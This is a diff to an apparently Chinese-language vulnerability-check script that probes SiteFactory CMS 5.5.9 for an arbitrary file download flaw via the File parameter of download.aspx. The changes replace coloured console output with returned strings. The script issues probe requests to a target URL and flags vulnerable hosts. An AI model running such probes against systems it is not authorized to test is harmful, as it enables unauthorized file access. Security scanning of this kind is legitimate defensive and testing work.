@@ -8,8 +8,8 @@ description: 文件/jyxx/manage/download.aspx参数File未过滤可下载任意�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class xtcms_download_filedownload_BaseVerify:
     def __init__(self, url):
@@ -26,12 +26,12 @@ class xtcms_download_filedownload_BaseVerify:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.headers["Content-Type"] == "application/xml":
-                    cprint("[+]存在SiteFactory CMS 5.5.9任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    return "[+]存在SiteFactory CMS 5.5.9任意文件下载漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = xtcms_download_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
